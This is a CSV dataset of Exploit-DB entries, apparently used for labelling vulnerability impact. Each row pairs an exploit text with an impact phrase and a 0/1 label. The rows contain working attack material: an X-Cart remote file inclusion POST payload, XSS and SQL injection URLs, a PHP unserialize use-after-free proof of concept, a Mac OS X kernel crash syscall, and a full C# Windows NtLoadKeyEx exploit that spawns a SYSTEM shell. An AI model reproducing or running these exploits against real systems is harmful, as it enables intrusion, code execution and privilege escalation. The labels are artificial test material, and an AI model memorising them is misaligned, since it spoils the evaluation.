43842,"X-Cart < 4.1.3 - Arbitrary Variable Overwrite X-Cart Arbitrary Variable Overwrite  Vendor: Qualiteam Product: X-Cart Version: <= 4.1.3 Website: http://www.x-cart.com/  BID: 20108  CVE: CVE-2006-4904  OSVDB: 28957  SECUNIA: 22005   Description: X-Cart is a commercial web based eCommerce solution written in PHP and MySQL that allows for webmasters to host an online marketplace. Unfortunately an attacker may be able to execute arbitrary php code on an X-Cart installation by overwriting key configuration variables. However, because the vulnerability allows for any variables to be overwritten other attacks such as SQL Injection are probably possible as well. Qualiteam have released an updated version of their X-Cart software, and users are strongly encouraged to upgrade as soon as possible or delete the cmpi.php script that resides within the payments directory.    Arbitrary Variable Overwriting X-Cart comes with a number of payment processing scripts. Unfortunately the Cardinal payment processing script (cmpi.php) is vulnerable to arbitrary variable overwriting that allows for an attacker to conduct various attacks including arbitrary php code execution. Let's have a look at the vulnerable code in question.  if ($HTTP_POST_VARS) { 	foreach ($HTTP_POST_VARS as $var => $value) { 		$$var = $value; 	} }  As we can see every single post variable is dynamically evaluated. This is especially dangerous because register globals and magic quotes gpc settings do not affect an attackers ability to overwrite key configuration variables.   stand_alone=0&httpsmod_active=1&orderids=1&close_frame=1&xcart_dir=http://shell   By sending a post request with the above variables set will automatically include an execute a remote arbitrary file on the vulnerable X-Cart installation, which in turn leads to remote php code execution on the underlying web server in most cases.    Solution: The X-Cart team were very quick and professional in their response to this issue.An updated version of X-Cart has been released and users are encouraged to upgrade as soon as possible.    Credits: James Bercegay of the GulfTech Security Research Team",execute arbitrary php code on an X-Cart installation,1
37881,"Adobe Flash - Shared Object Type Confusion Source: https://code.google.com/p/google-security-research/issues/detail?id=434&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id  The Shared Object constructor does not check that the object it is provided is of type Object before setting it to be of type SharedObject. This can cause problems if another method (such as Sound.loadSound) calls into script between checking the input object type, and casting its native object. A PoC is as follows:  class subso extends Sound{  	public function subso(f){ 			 	super(""_level0.test""); 	var n = {valueOf : func}; 	_global.func = f; 	_global.t = this; 	var f2 = this.loadSound; 	f2.call(this, n, 1); }  function func(){ 	 	_global.func(_global.t,""/sosuper.swf"", ""/sosuper.swf""); 	return 1; 	} } 	  A sample fla, swf and AS file are attached. Note that this PoC needs to be hosted on a webserver to work and only works on 32-bit systems (tested on Windows Chrome). song1.mp3 should be put in the same folder on the server as the swf, it is needed for loadSound to work. This bug is likely only exploitable on 32-bit systems due to how the type-confused fields line up.  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37881.zip",denial of service,1
35418,WordPress Plugin Inline Gallery 0.3.9 - 'do' Cross-Site Scripting source: https://www.securityfocus.com/bid/46781/info  The Inline Gallery WordPress Plugin is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Inline Gallery WordPress Plugin 0.3.9 is vulnerable; other versions may also be affected.   http://www.example.com/wp-content/plugins/inline-gallery/browser/browser.php?do=%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
25002,Hornbill Supportworks ITSM 1.0.0 - SQL Injection Summary     SQL Injection Vulnerability in ITSM component of Hornbill Supportworks Application         CVE number: CVE-2013-2594      Impact: High      Vendor homepage: http://www.hornbill.com      Vendor notified: 19/11/2012      Vendor response: This issue has reportedly been fixed but the vendor refused to give version details.      Credit: Joseph Sheridan of ReactionIS     Affected Products     Supportworks ITSM versions 1.0.0 and possibly other versions     Details     There is a SQL injection vulnerability in the ITSM component of the Supportworks Application. The vulnerable file is calldiary.php found in the /reports folder of the webroot. The following URL demonstrates the issue:        http://vulnhost.com/reports/calldiary.php?callref=VULN      This attack can be used to take full control of the host by writing a php webshell document (using mysql 'into outfile') to the webroot.        Impact     An attacker may be able to take full control of the Supportworks server and execute arbitrary operating-system commands.     Solution     Upgrade to the latest available ITSM version - contact Vendor for more details.     http://www.reactionpenetrationtesting.co.uk   http://www.reactionpenetrationtesting.co.uk/research.html   http://www.reactionpenetrationtesting.co.uk/security-testing-services.html,take full control of the Supportworks server and execute arbitrary operating-system commands,1
29201,"Apple Mac OSX 10.4.x - 'Shared_Region_Make_Private_Np' Kernel Function Local Memory Corruption /* source: https://www.securityfocus.com/bid/21349/info  Apple Mac OS X is prone to a local memory-corruption vulnerability. This issue occurs when the operating system fails to handle specially crafted arguments to a system call.   Attackers may exploit this issue to cause a kernel panic, effectively denying further service to legitimate users. Due to the nature of this issue, successful exploits may potentially result in the execution of arbitrary machine code in the context of the affected kernel, but this has not been confirmed.  Mac OS X version 10.4.8 is vulnerable to this issue; other versions may also be affected. */   /*  * Copyright 2006 (c) LMH <lmh@info-pull.com>.  * All Rights Reserved.  * ----             *               .---. .---.   *              :     : o   :    me want cookie and clues! L0W LEVA! - A  J. H  *          _..-:   o :     :-.._    /   *      .-''  '  `---' `---' ""   ``-.      *    .'   ""   '  ""  .    ""  . '  ""  `.   *   :   '.---.,,.,...,.,.,.,..---.  ' ;  *   `. "" `.                     .' "" .' kudos to ilja, kevin and icer.  *    `.  '`.                   .' ' .'           ""proof of concept"" for  *     `.    `-._           _.-' ""  .'  .-------.       MOKB-28-11-2006.  *       `. ""    '""--...--""'  . ' .'  .'  · o   ·`.  *       .'`-._'    "" .     "" _.-'`. :  C o C o A :  *     .'      ```--.....--'''    ' `:_ o      o  :  *   .'    ""     '         ""     ""   ; `.;"";"";""; _'  *  ;         '       ""       '     . ; .' ; ; ;  * ;     '         '       '   ""    .'      .-'  * '  ""     ""   '      ""           ""    _.-'  */  #include <stdio.h> #include <sys/types.h> #include <fcntl.h>  int main() { 		/* shared_region_make_private_np = 300 (xnu-792.6.70),  3rd arg unused */         syscall(300, 0x8000000, 0xdeadface, 0xffffffff);         return 0; }",the operating system fails to handle specially crafted arguments to a system call,0
38122,"PHP 5.4/5.5/5.6 - SplObjectStorage 'Unserialize()' Use-After-Free Yet Another Use After Free Vulnerability in unserialize() with SplObjectStorage  Taoguang Chen <[@chtg](http://github.com/chtg)>  Write Date: 2015.8.27  Release Date: 2015.9.4  A use-after-free vulnerability was discovered in unserialize() with SplObjectStorage object's deserialization and crafted object's __wakeup() magic method that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.  Affected Versions ------------ Affected is PHP 5.6 < 5.6.13 Affected is PHP 5.5 < 5.5.29 Affected is PHP 5.4 < 5.4.45  Credits ------------ This vulnerability was disclosed by Taoguang Chen.  Description ------------       ALLOC_INIT_ZVAL(pentry);     if (!php_var_unserialize(&pentry, &p, s + buf_len, &var_hash TSRMLS_CC)) {       zval_ptr_dtor(&pentry);       goto outexcept;     }     if(Z_TYPE_P(pentry) != IS_OBJECT) {       goto outexcept;     }     ALLOC_INIT_ZVAL(pinf);     if (*p == ',') { /* new version has inf */       ++p;       if (!php_var_unserialize(&pinf, &p, s + buf_len, &var_hash TSRMLS_CC)) {         zval_ptr_dtor(&pinf);         goto outexcept;       }     }   It has been demonstrated many times before that __wakeup() leads to ZVAL is freed from memory. However during deserialization will still allow to use R: or r: to set references to that already freed memory. It is possible to use-after-free attack and execute arbitrary code remotely.  Proof of Concept Exploit ------------ The PoC works on standard MacOSX 10.11 installation of PHP 5.6.12.   <?php  class obj {   var $ryat;   function __wakeup() {     $this->ryat = 1;   } }  $fakezval = ptr2str(1122334455); $fakezval .= ptr2str(0); $fakezval .= ""\x00\x00\x00\x00""; $fakezval .= ""\x01""; $fakezval .= ""\x00""; $fakezval .= ""\x00\x00"";  $inner = 'x:i:1;O:8:""stdClass"":0:{},i:1;;m:a:0:{}'; $exploit = 'a:5:{i:0;i:1;i:1;C:16:""SplObjectStorage"":'.strlen($inner).':{'.$inner.'}i:2;O:3:""obj"":1:{s:4:""ryat"";R:3;}i:3;R:6;i:4;s:'.strlen($fakezval).':""'.$fakezval.'"";}';  $data = unserialize($exploit);  var_dump($data);  function ptr2str($ptr) {   $out = '';   for ($i = 0; $i < 8; $i++) {     $out .= chr($ptr & 0xff);     $ptr >>= 8;   }   return $out; }  ?>   Test the PoC on the command line:   $ php uafpoc.php array(5) {   [0]=>   int(1)   [1]=>   &int(1)   [2]=>   object(obj)#3 (1) {     [""ryat""]=>     &int(1)   }   [3]=>   int(1122334455)  <===  so we can control the memory and create fake ZVAL :)   [4]=>   string(24) ""?v?B????"" }",use-after-free,1
34651,"e-Soft24 Jokes Portal Script Seo 1.0 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/43303/info  e-Soft24 Jokes Portal Script Seo is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  e-Soft24 Jokes Portal Script Seo 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/SearchAction.php?what='""><SCRIPT>alert(String.fromCharCode(88%2C83%2C83))<%2FSCRIPT><MARQUEE+BGCOLOR%3D""RED""><H1>Xss<%2FH1><%2FMARQUEE>&ssub=GO  http://www.example.com/forgot.html => put : '""><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><MARQUEE BGCOLOR=""RED""><H1>Xss</H1></MARQUEE> 			 http://www.example.com/scripts/jokes-portal/SearchAction.php?what=%27%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3CMARQUEE+BGCOLOR%3D%22RED%22%3E%3CH1%3EXss%3C%2FH1%3E%3C%2FMARQUEE%3E&ssub=GO",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
30748,"XOOPS 2.0.17.1 Mylinks Module - 'Brokenlink.php' SQL Injection source: https://www.securityfocus.com/bid/26392/info  Xoops Mylinks module is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.  Exploiting this vulnerability could permit remote attackers to pass malicious input to database queries, resulting in the modification of query logic or other attacks.  Xoops 2.0.17.1 is vulnerable; other versions may also be affected.   http://www.example.com.com/modules/mylinks/brokenlink.php?lid=1%20OR%201=2",pass malicious input to database queries,1
25346,"Active Auction House - 'default.asp' Multiple SQL Injections source: https://www.securityfocus.com/bid/13032/info  Active Auction House is reportedly affected by multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/activeauctionsuperstore/default.asp?Sortby=ItemName&SortDir='SQL_INJECTION http://www.example.com/activeauctionsuperstore/default.asp?Sortby='SQL_INJECTION",exploit vulnerabilities in the underlying database implementation,1
40429,"Microsoft Windows 8.1 Update 2 / 10 10586 (x86/x64) - NtLoadKeyEx User Hive Attachment Point Privilege Escalation (MS16-111) /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=865  Windows: NtLoadKeyEx User Hive Attachment Point EoP Platform: Windows 10 10586 (32/64) and 8.1 Update 2, not tested Windows 7 Class: Elevation of Privilege  Summary: The NtLoadKeyEx system call allows an unprivileged user to load registry hives outside of the \Registry\A hidden attachment point which can be used to elevate privileges.   Description:  Windows Vista and above support loading per-user registry hives. Normally calling NtLoadKeyEx would require Backup/Restore privileges to do this making it useless for the average user.. However per-user hives are permitted from a normal user. When calling the Win32 API RegLoadAppKey the hive is loaded under \Registry\A which is a hidden attachment key and doesn’t provide any obvious benefit from an EoP perspective (especially as the root name is a random GUID). However it turns out that you can load the per-user hive to any attachment point such as \Registry\User or \Registry\Machine. Interestingly this works even as a sandboxed user, so it would be an escape out of EPM/Edge/Bits of Chrome etc.  So how can we exploit this? The simplest way I’ve found is to register the hive as the local system ""Classes"" key. This isn’t registered by default, however a quick inspection indicates that local system does indeed refer to this key when trying to access COM registration information. So by putting an appropriate registration in \Registry\User\S-1-5-18_Classes it will be loaded as a local system component and privileged execution is achieved.  Proof of Concept:  I’ve provided a PoC as a C# source code file. You need to compile it first. It uses the issue with NtLoadKeyEx to map a custom hive over the local system’s Classes key. It then registers a type library which is loaded when WinLogon is signaled. I signal WinLogon by locking the screen. It abuses the fact that registered type library paths when passed to LoadTypeLib can be a COM moniker. So I register a COM scriptlet moniker which will be bound when LoadTypeLib parses it, this causes a local scriptlet file to be executed which respawns the original binary to spawn an interactive command prompt. By doing it this way it works on 32 bit and 64 bit without any changes.  Note that it doesn’t need to use the Lock Screen, just this was the first technique I found. Many system services are loading data out of the registry hive, it would just be a case of finding something which could be trivially triggered by the application. In any case imo the bug is the behaviour of NtLoadKeyEx, not how I exploit it.  1) Compile the C# source code file. 2) Execute the PoC executable as a normal user. 3) The PoC should lock the screen. You’ll need to unlock again (do not log out). 4) If successful a system level command prompt should be available on the user’s desktop when you unlock.  Expected Result: You can’t create a per-user hive outside of the hidden attachment point.  Observed Result: Well obviously you can. */  using Microsoft.Win32; using Microsoft.Win32.SafeHandles; using System; using System.Diagnostics; using System.IO; using System.Reflection; using System.Runtime.InteropServices; using System.Text; using System.Threading;  namespace Poc_NtLoadKeyEx_EoP {   class Program   {     [Flags]     public enum AttributeFlags : uint     {       None = 0,       Inherit = 0x00000002,       Permanent = 0x00000010,       Exclusive = 0x00000020,       CaseInsensitive = 0x00000040,       OpenIf = 0x00000080,       OpenLink = 0x00000100,       KernelHandle = 0x00000200,       ForceAccessCheck = 0x00000400,       IgnoreImpersonatedDevicemap = 0x00000800,       DontReparse = 0x00001000,     }      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]     public sealed class UnicodeString     {       ushort Length;       ushort MaximumLength;       [MarshalAs(UnmanagedType.LPWStr)]       string Buffer;        public UnicodeString(string str)       {         Length = (ushort)(str.Length * 2);         MaximumLength = (ushort)((str.Length * 2) + 1);         Buffer = str;       }     }      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]     public sealed class ObjectAttributes : IDisposable     {       int Length;       IntPtr RootDirectory;       IntPtr ObjectName;       AttributeFlags Attributes;       IntPtr SecurityDescriptor;       IntPtr SecurityQualityOfService;        private static IntPtr AllocStruct(object s)       {         int size = Marshal.SizeOf(s);         IntPtr ret = Marshal.AllocHGlobal(size);         Marshal.StructureToPtr(s, ret, false);         return ret;       }        private static void FreeStruct(ref IntPtr p, Type struct_type)       {         Marshal.DestroyStructure(p, struct_type);         Marshal.FreeHGlobal(p);         p = IntPtr.Zero;       }        public ObjectAttributes(string object_name)       {         Length = Marshal.SizeOf(this);         if (object_name != null)         {           ObjectName = AllocStruct(new UnicodeString(object_name));         }         Attributes = AttributeFlags.None;       }        public void Dispose()       {         if (ObjectName != IntPtr.Zero)         {           FreeStruct(ref ObjectName, typeof(UnicodeString));         }         GC.SuppressFinalize(this);       }        ~ObjectAttributes()       {         Dispose();       }     }      [Flags]     public enum LoadKeyFlags     {       None = 0,       AppKey = 0x10,       Exclusive = 0x20,       Unknown800 = 0x800,     }      [Flags]     public enum GenericAccessRights : uint     {       None = 0,       GenericRead = 0x80000000,       GenericWrite = 0x40000000,       GenericExecute = 0x20000000,       GenericAll = 0x10000000,       Delete = 0x00010000,       ReadControl = 0x00020000,       WriteDac = 0x00040000,       WriteOwner = 0x00080000,       Synchronize = 0x00100000,       MaximumAllowed = 0x02000000,     }      public class NtException : ExternalException     {       [DllImport(""kernel32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]       private static extern IntPtr GetModuleHandle(string modulename);        [Flags]       enum FormatFlags       {         AllocateBuffer = 0x00000100,         FromHModule = 0x00000800,         FromSystem = 0x00001000,         IgnoreInserts = 0x00000200       }        [DllImport(""kernel32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]       private static extern int FormatMessage(         FormatFlags dwFlags,         IntPtr lpSource,         int dwMessageId,         int dwLanguageId,         out IntPtr lpBuffer,         int nSize,         IntPtr Arguments       );        [DllImport(""kernel32.dll"")]       private static extern IntPtr LocalFree(IntPtr p);        private static string StatusToString(int status)       {         IntPtr buffer = IntPtr.Zero;         try         {           if (FormatMessage(FormatFlags.AllocateBuffer | FormatFlags.FromHModule | FormatFlags.FromSystem | FormatFlags.IgnoreInserts,               GetModuleHandle(""ntdll.dll""), status, 0, out buffer, 0, IntPtr.Zero) > 0)           {             return Marshal.PtrToStringUni(buffer);           }         }         finally         {           if (buffer != IntPtr.Zero)           {             LocalFree(buffer);           }         }         return String.Format(""Unknown Error: 0x{0:X08}"", status);       }        public NtException(int status) : base(StatusToString(status))       {       }     }      public static void StatusToNtException(int status)     {       if (status < 0)       {         throw new NtException(status);       }     }      [DllImport(""ntdll.dll"")]     public static extern int NtLoadKeyEx(ObjectAttributes DestinationName, ObjectAttributes FileName, LoadKeyFlags Flags,         IntPtr TrustKeyHandle, IntPtr EventHandle, GenericAccessRights DesiredAccess, out SafeRegistryHandle KeyHandle, int Unused);      static string scriptlet_code = @""<?xml version='1.0'?> <package> <component id='giffile'> <registration   description='Dummy'   progid='giffile'   version='1.00'   remotable='True'>  </registration> <script language='JScript'> <![CDATA[   new ActiveXObject('Wscript.Shell').exec('%CMDLINE%'); ]]> </script> </component> </package> "";      public enum TokenInformationClass     {       TokenSessionId = 12     }      [DllImport(""ntdll.dll"")]     public static extern int NtClose(IntPtr handle);      [DllImport(""ntdll.dll"", CharSet = CharSet.Unicode)]     public static extern int NtOpenProcessTokenEx(           IntPtr ProcessHandle,           GenericAccessRights DesiredAccess,           AttributeFlags HandleAttributes,           out IntPtr TokenHandle);      public sealed class SafeKernelObjectHandle   : SafeHandleZeroOrMinusOneIsInvalid     {       public SafeKernelObjectHandle()         : base(true)       {       }        public SafeKernelObjectHandle(IntPtr handle, bool owns_handle)         : base(owns_handle)       {         SetHandle(handle);       }        protected override bool ReleaseHandle()       {         if (!IsInvalid)         {           NtClose(this.handle);           this.handle = IntPtr.Zero;           return true;         }         return false;       }     }      public enum TokenType     {       Primary = 1,       Impersonation = 2     }      [DllImport(""ntdll.dll"", CharSet = CharSet.Unicode)]     public static extern int NtDuplicateToken(     IntPtr ExistingTokenHandle,     GenericAccessRights DesiredAccess,     ObjectAttributes ObjectAttributes,     bool EffectiveOnly,     TokenType TokenType,     out IntPtr NewTokenHandle     );      public static SafeKernelObjectHandle DuplicateToken(SafeKernelObjectHandle existing_token)     {       IntPtr new_token;              using (ObjectAttributes obja = new ObjectAttributes(null))       {         StatusToNtException(NtDuplicateToken(existing_token.DangerousGetHandle(),           GenericAccessRights.MaximumAllowed, obja, false, TokenType.Primary, out new_token));         return new SafeKernelObjectHandle(new_token, true);       }     }      public static SafeKernelObjectHandle OpenProcessToken()     {       IntPtr new_token;       StatusToNtException(NtOpenProcessTokenEx(new IntPtr(-1),         GenericAccessRights.MaximumAllowed, AttributeFlags.None, out new_token));       using (SafeKernelObjectHandle ret = new SafeKernelObjectHandle(new_token, true))       {         return DuplicateToken(ret);       }     }      [DllImport(""ntdll.dll"")]     public static extern int NtSetInformationToken(       SafeKernelObjectHandle TokenHandle,       TokenInformationClass TokenInformationClass,       byte[] TokenInformation,       int TokenInformationLength);      public static void SetTokenSessionId(SafeKernelObjectHandle token, int session_id)     {       byte[] buffer = BitConverter.GetBytes(session_id);             NtSetInformationToken(token, TokenInformationClass.TokenSessionId,          buffer, buffer.Length);     }      static Tuple<EventWaitHandle, EventWaitHandle> GetEvents()     {       EventWaitHandle user_ev = new EventWaitHandle(false, EventResetMode.AutoReset, @""Global\ntloadkey_event_user_wait"");       EventWaitHandle sys_ev = new EventWaitHandle(false, EventResetMode.AutoReset, @""Global\ntloadkey_event_sys_wait"");        return new Tuple<EventWaitHandle, EventWaitHandle>(user_ev, sys_ev);     }      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]     struct STARTUPINFO     {       public Int32 cb;       public string lpReserved;       public string lpDesktop;       public string lpTitle;       public Int32 dwX;       public Int32 dwY;       public Int32 dwXSize;       public Int32 dwYSize;       public Int32 dwXCountChars;       public Int32 dwYCountChars;       public Int32 dwFillAttribute;       public Int32 dwFlags;       public Int16 wShowWindow;       public Int16 cbReserved2;       public IntPtr lpReserved2;       public IntPtr hStdInput;       public IntPtr hStdOutput;       public IntPtr hStdError;     }      [StructLayout(LayoutKind.Sequential)]     internal struct PROCESS_INFORMATION     {       public IntPtr hProcess;       public IntPtr hThread;       public int dwProcessId;       public int dwThreadId;     }      enum CreateProcessFlags     {       CREATE_BREAKAWAY_FROM_JOB = 0x01000000,       CREATE_DEFAULT_ERROR_MODE = 0x04000000,       CREATE_NEW_CONSOLE = 0x00000010,       CREATE_NEW_PROCESS_GROUP = 0x00000200,       CREATE_NO_WINDOW = 0x08000000,       CREATE_PROTECTED_PROCESS = 0x00040000,       CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,       CREATE_SEPARATE_WOW_VDM = 0x00000800,       CREATE_SHARED_WOW_VDM = 0x00001000,       CREATE_SUSPENDED = 0x00000004,       CREATE_UNICODE_ENVIRONMENT = 0x00000400,       DEBUG_ONLY_THIS_PROCESS = 0x00000002,       DEBUG_PROCESS = 0x00000001,       DETACHED_PROCESS = 0x00000008,       EXTENDED_STARTUPINFO_PRESENT = 0x00080000,       INHERIT_PARENT_AFFINITY = 0x00010000     }      [DllImport(""advapi32.dll"", SetLastError = true, CharSet = CharSet.Auto)]     static extern bool CreateProcessAsUser(       IntPtr hToken,       string lpApplicationName,       string lpCommandLine,       IntPtr lpProcessAttributes,       IntPtr lpThreadAttributes,       bool bInheritHandles,       CreateProcessFlags dwCreationFlags,       IntPtr lpEnvironment,       string lpCurrentDirectory,       ref STARTUPINFO lpStartupInfo,       out PROCESS_INFORMATION lpProcessInformation);      static void SpawnInteractiveCmd(int sessionid)     {       Tuple<EventWaitHandle, EventWaitHandle> events = GetEvents();       Console.WriteLine(""Got Events"");       events.Item1.Set();       events.Item2.WaitOne();       SafeKernelObjectHandle token = OpenProcessToken();       SetTokenSessionId(token, sessionid);        STARTUPINFO startInfo = new STARTUPINFO();       startInfo.cb = Marshal.SizeOf(startInfo);       PROCESS_INFORMATION procInfo;        CreateProcessAsUser(token.DangerousGetHandle(), null, ""cmd.exe"",          IntPtr.Zero, IntPtr.Zero, false, CreateProcessFlags.CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref startInfo, out procInfo);     }      [DllImport(""user32.dll"")]     static extern bool LockWorkStation();      static void DoExploit()     {       Console.WriteLine(""{0}"", Assembly.GetCallingAssembly().Location);       Tuple<EventWaitHandle, EventWaitHandle> events = GetEvents();        string cmdline = String.Format(@""""""{0}"""" {1}"",         Assembly.GetCallingAssembly().Location.Replace('\\', '/'), Process.GetCurrentProcess().SessionId);       string scriptlet_path = Path.GetFullPath(""dummy.sct"");       File.WriteAllText(scriptlet_path, scriptlet_code.Replace(""%CMDLINE%"", cmdline), Encoding.ASCII);       Console.WriteLine(""{0}"", scriptlet_path);       string scriptlet_url = ""script:"" + new Uri(scriptlet_path).AbsoluteUri;       Console.WriteLine(""{0}"", scriptlet_url);       string reg_name = @""\Registry\User\S-1-5-18_Classes"";       string path = @""\??\"" + Path.GetFullPath(""dummy.hiv"");       File.Delete(""dummy.hiv"");       ObjectAttributes KeyName = new ObjectAttributes(reg_name);       ObjectAttributes FileName = new ObjectAttributes(path);       SafeRegistryHandle keyHandle;        StatusToNtException(NtLoadKeyEx(KeyName,         FileName, LoadKeyFlags.AppKey, IntPtr.Zero,         IntPtr.Zero, GenericAccessRights.GenericAll, out keyHandle, 0));        RegistryKey key = RegistryKey.FromHandle(keyHandle);       RegistryKey typelib_key = key.CreateSubKey(""TypeLib"").CreateSubKey(""{D597DEED-5B9F-11D1-8DD2-00AA004ABD5E}"").CreateSubKey(""2.0"").CreateSubKey(""0"");       typelib_key.CreateSubKey(""win32"").SetValue(null, scriptlet_url);       typelib_key.CreateSubKey(""win64"").SetValue(null, scriptlet_url);        Console.WriteLine(""Handle: {0} - Key {1} - Path {2}"", keyHandle.DangerousGetHandle(), reg_name, path);       Console.WriteLine(""Lock screen and re-login."");       LockWorkStation();       events.Item1.WaitOne();       typelib_key.DeleteSubKey(""win32"");       typelib_key.DeleteSubKey(""win64"");       File.Delete(scriptlet_path);       typelib_key.Close();       key.Close();             events.Item2.Set();     }      static void Main(string[] args)     {       try       {         if (args.Length > 0)         {           SpawnInteractiveCmd(int.Parse(args[0]));         }         else         {           DoExploit();         }       }       catch (Exception ex)       {         Console.WriteLine(ex.Message);       }     }   } }",load registry hives outside of the \Registry\A hidden attachment point which can be used to elevate privileges,0
